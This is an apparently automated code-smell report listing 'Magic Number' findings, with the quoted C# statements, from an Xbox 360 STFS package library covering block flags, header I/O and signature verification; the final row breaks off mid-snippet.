Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: try {  	switch (AllocationFlag) {  	case HashFlag.Unallocated:  		Flags = (uint)((1 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedFree:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseOld:  		Flags = (uint)((3 << 30) | BlocksFree << 15);  		return true;  	case HashFlag.AllocatedInUseCurrent:  		Flags = (uint)((2 << 30) | BlocksFree << 15);  		return true;  	}  	return false;  }  catch {  	return false;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((1 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((1 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((3 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((3 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((3 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following statement contains a magic number: Flags = (uint)((2 << 30) | BlocksFree << 15);  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (xTotalBlocks > SpaceBetween [2]) {  	xStruct = null;  	throw STFSExcepts.MaxOver;  }  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,The following statement contains a magic number: switch (xType) {  case STFSType.Type0:  	{  		xSpaceBetween [0] = 0xAB;  		xSpaceBetween [1] = 0x718F;  		xSpaceBetween [2] = 0xFE7DA;  		// Max Block  		Shift = 0;  	}  	break;  case STFSType.Type1:  	{  		xSpaceBetween [0] = 0xAC;  		xSpaceBetween [1] = 0x723A;  		xSpaceBetween [2] = 0xFD00B;  		// Max Block before size of package over does FATX limit  		Shift = 1;  	}  	break;  default:  	break;  }  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,The following statement contains a magic number: switch (xType) {  case STFSType.Type0:  	{  		xSpaceBetween [0] = 0xAB;  		xSpaceBetween [1] = 0x718F;  		xSpaceBetween [2] = 0xFE7DA;  		// Max Block  		Shift = 0;  	}  	break;  case STFSType.Type1:  	{  		xSpaceBetween [0] = 0xAC;  		xSpaceBetween [1] = 0x723A;  		xSpaceBetween [2] = 0xFD00B;  		// Max Block before size of package over does FATX limit  		Shift = 1;  	}  	break;  default:  	break;  }  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,The following statement contains a magic number: xSpaceBetween [2] = 0xFE7DA;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,XSetStructure,The following statement contains a magic number: xSpaceBetween [2] = 0xFD00B;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: TopRecord = new BlockRecord (((uint)(xType >> 1) << 30 | (uint)xOldBlocks << 15));  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: TopRecord = new BlockRecord (((uint)(xType >> 1) << 30 | (uint)xOldBlocks << 15));  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (xTotalBlocks > SpaceBetween [2]) {  	xStruct = null;  	return;  }  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: xStruct = xPackage.xIO.ReadBytes (5);  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (xBaseByte == 0xB) {  	if (idx == 1)  		XSetStructure (STFSType.Type0);  	else  		throw STFSExcepts.Type;  }  else if (xBaseByte == 0xA) {  	if (idx == 0 || idx == 2)  		XSetStructure (STFSType.Type1);  	else  		throw STFSExcepts.Type;  }  else  	throw STFSExcepts.Type;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (xBaseByte == 0xA) {  	if (idx == 0 || idx == 2)  		XSetStructure (STFSType.Type1);  	else  		throw STFSExcepts.Type;  }  else  	throw STFSExcepts.Type;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (idx == 0 || idx == 2)  	XSetStructure (STFSType.Type1);  else  	throw STFSExcepts.Type;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: if (xBlockCount > SpaceBetween [2])  	throw STFSExcepts.MaxOver;  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: TopRecord = new BlockRecord (((uint)((idx >> 1) & 1) << 30 | (uint)xOldBlocks << 15));  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,STFSDescriptor,The following statement contains a magic number: TopRecord = new BlockRecord (((uint)((idx >> 1) & 1) << 30 | (uint)xOldBlocks << 15));  
Magic Number,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GetData,The following statement contains a magic number: xReturn.AddRange (new byte[20]);  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,ItemEntry,The following statement contains a magic number: xFlag = (byte)(((xIsFolder ? 1 : 0) << 7) | xName.Length);  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,ItemEntry,The following statement contains a magic number: xFlag = (byte)((x.FolderFlag ? 1 : 0) << 7 | (x.UnknownFlag ? 1 : 0) << 6 | xName.Length);  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,ItemEntry,The following statement contains a magic number: xFlag = (byte)((x.FolderFlag ? 1 : 0) << 7 | (x.UnknownFlag ? 1 : 0) << 6 | xName.Length);  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetEntryData,The following statement contains a magic number: try {  	List<byte> xReturn = new List<byte> ();  	xReturn.AddRange (Encoding.ASCII.GetBytes (xName.ToCharArray ()));  	xReturn.AddRange (new byte[0x28 - xName.Length]);  	xReturn.Add (xFlag);  	List<byte> xbuff = new List<byte> ();  	xbuff.AddRange (BitConv.GetBytes (xBlockCount' false));  	xbuff.RemoveAt (3);  	xReturn.AddRange (xbuff);  	xReturn.AddRange (xbuff);  	xbuff.Clear ();  	xbuff.AddRange (BitConv.GetBytes (xStartBlock' false));  	xbuff.RemoveAt (3);  	xReturn.AddRange (xbuff);  	xbuff.Clear ();  	xbuff = null;  	xReturn.AddRange (BitConv.GetBytes (xFolderPointer' true));  	xReturn.AddRange (BitConv.GetBytes (xSize' true));  	xReturn.AddRange (BitConv.GetBytes (xCreated' false));  	xReturn.AddRange (BitConv.GetBytes (xAccessed' false));  	return xReturn.ToArray ();  }  catch {  	return new byte[0];  }  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetEntryData,The following statement contains a magic number: try {  	List<byte> xReturn = new List<byte> ();  	xReturn.AddRange (Encoding.ASCII.GetBytes (xName.ToCharArray ()));  	xReturn.AddRange (new byte[0x28 - xName.Length]);  	xReturn.Add (xFlag);  	List<byte> xbuff = new List<byte> ();  	xbuff.AddRange (BitConv.GetBytes (xBlockCount' false));  	xbuff.RemoveAt (3);  	xReturn.AddRange (xbuff);  	xReturn.AddRange (xbuff);  	xbuff.Clear ();  	xbuff.AddRange (BitConv.GetBytes (xStartBlock' false));  	xbuff.RemoveAt (3);  	xReturn.AddRange (xbuff);  	xbuff.Clear ();  	xbuff = null;  	xReturn.AddRange (BitConv.GetBytes (xFolderPointer' true));  	xReturn.AddRange (BitConv.GetBytes (xSize' true));  	xReturn.AddRange (BitConv.GetBytes (xCreated' false));  	xReturn.AddRange (BitConv.GetBytes (xAccessed' false));  	return xReturn.ToArray ();  }  catch {  	return new byte[0];  }  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetEntryData,The following statement contains a magic number: xbuff.RemoveAt (3);  
Magic Number,X360.STFS,ItemEntry,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,GetEntryData,The following statement contains a magic number: xbuff.RemoveAt (3);  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,read,The following statement contains a magic number: for (int i = 0; i < 9; i++)  	xTitles [i] = xIO.ReadString (StringForm.Unicode' 0x80).Replace ("\0"' "");  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,read,The following statement contains a magic number: for (int i = 0; i < 9; i++)  	xDescriptions [i] = xIO.ReadString (StringForm.Unicode' 0x80).Replace ("\0"' "");  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,HeaderData,The following statement contains a magic number: for (int i = 0; i < 9; i++) {  	xTitles [i] = "";  	xDescriptions [i] = "";  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,Write,The following statement contains a magic number: try {  	if (x == null || !x.Accessed)  		return false;  	x.Position = 0x22C;  	foreach (STFSLicense b in xLisc) {  		x.Write (b.ID);  		x.Write (b.Var1);  		x.Write (b.Flags);  	}  	x.Position = 0x344;  	x.Write ((uint)xThisType);  	x.Write (MetaDataVersion);  	x.Write (xContentSize);  	x.Write (MediaID);  	x.Write (Version_);  	x.Write (Version_Base);  	x.Write (TitleID);  	x.Write (Platform);  	x.Write (ExecutableType);  	x.Write (DiscNumber);  	x.Write (DiscInSet);  	x.Write (SaveGameID);  	x.WriteUInt40 ((ulong)SaveConsoleID);  	x.Write (ProfileID);  	x.Position = 0x39D;  	x.Write (DataFileCount);  	x.Write (DataFileSize);  	x.Write (Reserved);  	x.Write (SeriesID);  	x.Write (SeasonID);  	x.Write (SeasonNumber);  	x.Write (EpidsodeNumber);  	x.Position += 0x28;  	x.Write (xDeviceID);  	for (int i = 0; i < 9; i++)  		x.Write (xTitles [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  	for (int i = 0; i < 9; i++)  		x.Write (xDescriptions [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  	x.Write (xPublisher' StringForm.Unicode' 0x40' PadLocale.Right' PadType.Null);  	x.Write (xTitle' StringForm.Unicode' 0x40' PadLocale.Right' PadType.Null);  	x.Write (IDTransferByte);  	x.Write (xPackageImage.Length);  	x.Write (xContentImage.Length);  	x.Write (xPackageImage);  	x.Write (new byte[0x4000 - xPackageImage.Length]);  	x.Write (xContentImage);  	x.Write (new byte[(0x4000 - xContentImage.Length)]);  	return true;  }  catch {  	return false;  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,Write,The following statement contains a magic number: try {  	if (x == null || !x.Accessed)  		return false;  	x.Position = 0x22C;  	foreach (STFSLicense b in xLisc) {  		x.Write (b.ID);  		x.Write (b.Var1);  		x.Write (b.Flags);  	}  	x.Position = 0x344;  	x.Write ((uint)xThisType);  	x.Write (MetaDataVersion);  	x.Write (xContentSize);  	x.Write (MediaID);  	x.Write (Version_);  	x.Write (Version_Base);  	x.Write (TitleID);  	x.Write (Platform);  	x.Write (ExecutableType);  	x.Write (DiscNumber);  	x.Write (DiscInSet);  	x.Write (SaveGameID);  	x.WriteUInt40 ((ulong)SaveConsoleID);  	x.Write (ProfileID);  	x.Position = 0x39D;  	x.Write (DataFileCount);  	x.Write (DataFileSize);  	x.Write (Reserved);  	x.Write (SeriesID);  	x.Write (SeasonID);  	x.Write (SeasonNumber);  	x.Write (EpidsodeNumber);  	x.Position += 0x28;  	x.Write (xDeviceID);  	for (int i = 0; i < 9; i++)  		x.Write (xTitles [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  	for (int i = 0; i < 9; i++)  		x.Write (xDescriptions [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  	x.Write (xPublisher' StringForm.Unicode' 0x40' PadLocale.Right' PadType.Null);  	x.Write (xTitle' StringForm.Unicode' 0x40' PadLocale.Right' PadType.Null);  	x.Write (IDTransferByte);  	x.Write (xPackageImage.Length);  	x.Write (xContentImage.Length);  	x.Write (xPackageImage);  	x.Write (new byte[0x4000 - xPackageImage.Length]);  	x.Write (xContentImage);  	x.Write (new byte[(0x4000 - xContentImage.Length)]);  	return true;  }  catch {  	return false;  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,Write,The following statement contains a magic number: for (int i = 0; i < 9; i++)  	x.Write (xTitles [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,Write,The following statement contains a magic number: for (int i = 0; i < 9; i++)  	x.Write (xDescriptions [i]' StringForm.Unicode' 0x80' PadLocale.Right' PadType.Null);  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,WriteText,The following statement contains a magic number: try {  	x.Position = 0;  	x.Write ("Signature Type - " + xMagic.ToString () + Environment.NewLine);  	x.Write ("Package Licences:" + Environment.NewLine);  	for (int i = 0; i < xLisc.Count; i++) {  		x.Write ("License " + i.ToString () + " ID: " + xLisc [i].ID.ToString ("X") + Environment.NewLine);  		x.Write ("License " + i.ToString () + " Bits: " + xLisc [i].Var1.ToString ("X") + Environment.NewLine);  		x.Write ("License " + i.ToString () + " Flags: " + xLisc [i].Flags.ToString ("X") + Environment.NewLine);  	}  	x.Write ("Package Type: " + xThisType.ToString () + Environment.NewLine);  	x.Write ("Meta Data Version: " + MetaDataVersion.ToString () + Environment.NewLine);  	x.Write ("Recorded ContentSize: " + xContentSize.ToString () + " bytes" + Environment.NewLine);  	x.Write ("Media ID: " + MediaID.ToString () + Environment.NewLine);  	x.Write ("Version: " + Version_.ToString () + Environment.NewLine);  	x.Write ("Version Base: " + Version_Base.ToString () + Environment.NewLine);  	x.Write ("Title ID: " + TitleID.ToString ("X2") + Environment.NewLine);  	x.Write ("Platform: " + Platform.ToString () + Environment.NewLine);  	x.Write ("Executable Type: " + ExecutableType.ToString () + Environment.NewLine);  	x.Write ("Disc Number: " + DiscNumber.ToString () + Environment.NewLine);  	x.Write ("Disc In Set: " + DiscInSet.ToString () + Environment.NewLine);  	x.Write ("Save Game ID: " + SaveGameID.ToString () + Environment.NewLine);  	x.Write ("Creator's Console ID: " + xSaveConsoleID.ToString ("X2") + Environment.NewLine);  	x.Write ("Creator's Profile ID: " + ProfileID.ToString ("X2") + Environment.NewLine);  	x.Write ("Data File Count: " + DataFileCount.ToString () + Environment.NewLine);  	x.Write ("Data File Size: " + DataFileSize.ToString () + Environment.NewLine);  	x.Write ("Series ID: " + SeriesID.HexString () + Environment.NewLine);  	x.Write ("Season ID: " + SeasonID.HexString () + Environment.NewLine);  	x.Write ("Season Number: " + SeasonNumber.ToString () + Environment.NewLine);  	x.Write ("Epidsode Number: " + EpidsodeNumber.ToString () + Environment.NewLine);  	x.Write ("Device ID: " + xDeviceID.HexString () + Environment.NewLine);  	x.Write ("Languages:" + Environment.NewLine);  	for (int i = 0; i < 9; i++) {  		x.Write (((Languages)i).ToString () + " Display Title and Description:" + Environment.NewLine);  		x.Write (xTitles [i] + Environment.NewLine);  		x.Write (xDescriptions [i] + Environment.NewLine);  	}  	x.Write ("Publisher Name: " + xPublisher + Environment.NewLine);  	x.Write ("Package Title: " + xTitle + Environment.NewLine);  	x.Write ("Package Transfer Type: " + IDTransfer.ToString ());  	x.Flush ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,WriteText,The following statement contains a magic number: for (int i = 0; i < 9; i++) {  	x.Write (((Languages)i).ToString () + " Display Title and Description:" + Environment.NewLine);  	x.Write (xTitles [i] + Environment.NewLine);  	x.Write (xDescriptions [i] + Environment.NewLine);  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeAnonymous,The following statement contains a magic number: try {  	xDeviceID = new byte[20];  	xSaveConsoleID = 0;  	ProfileID = 0;  	IDTransfer = TransferLock.AllowTransfer;  	ClearLicenses ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.STFS,HeaderData,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,MakeAnonymous,The following statement contains a magic number: xDeviceID = new byte[20];  
Magic Number,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following statement contains a magic number: try {  	AddToLog ("Verifying Signature");  	RSAParameters xRSAKeyz = new RSAParameters ();  	short xSigSpot = 0;  	switch (xHeader.Magic) {  	case PackageMagic.CON:  		// signature is the same way for both Dev and Stock  		{  			xSigSpot = 0x1AC;  			xIO.Position = 0x28;  			xRSAKeyz.Exponent = xIO.ReadBytes (4);  			xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  		}  		break;  	case PackageMagic.LIVE:  		{  			xSigSpot = 4;  			if (!xDev) {  				xRSAKeyz.Exponent = new byte[] {  					0'  					1'  					0'  					1  				};  				xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  			}  			else {  				xRSAKeyz.Exponent = new byte[] {  					0'  					0'  					0'  					3  				};  				DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  				xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  				xLK.Close ();  			}  		}  		break;  	case PackageMagic.PIRS:  		{  			xSigSpot = 4;  			if (!xDev) {  				